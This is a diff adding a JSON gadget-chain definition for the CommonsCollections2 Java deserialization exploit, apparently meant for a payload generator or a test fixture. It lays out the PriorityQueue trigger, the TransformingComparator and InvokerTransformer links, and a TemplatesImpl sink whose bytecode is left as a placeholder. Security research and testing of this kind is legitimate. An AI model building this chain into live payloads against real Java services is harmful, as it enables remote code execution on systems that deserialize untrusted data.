@@ -1,0 +1,32 @@
+{
+  "chain_type": "CommonsCollections2 — PriorityQueue + TransformingComparator (CC 4.x)",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject→heapify→siftDown→comparator.compare",
+  "links": [
+    {
+      "class": "org.apache.commons.collections4.comparators.TransformingComparator",
+      "field_overrides": {
+        "transformer": {"$ref": "link:1"},
+        "decorated": null
+      }
+    },
+    {
+      "class": "org.apache.commons.collections4.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "newTransformer",
+        "iParamTypes": [],
+        "iArgs": []
+      }
+    },
+    {
+      "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+      "field_overrides": {
+        "_bytecodes": ["EVIL_BYTECODE_PLACEHOLDER"],
+        "_name": "Exploit",
+        "_tfactory": {},
+        "_outputProperties": null
+      }
+    }
+  ],
+  "sink_method": "TemplatesImpl.newTransformer→defineClass"
+}
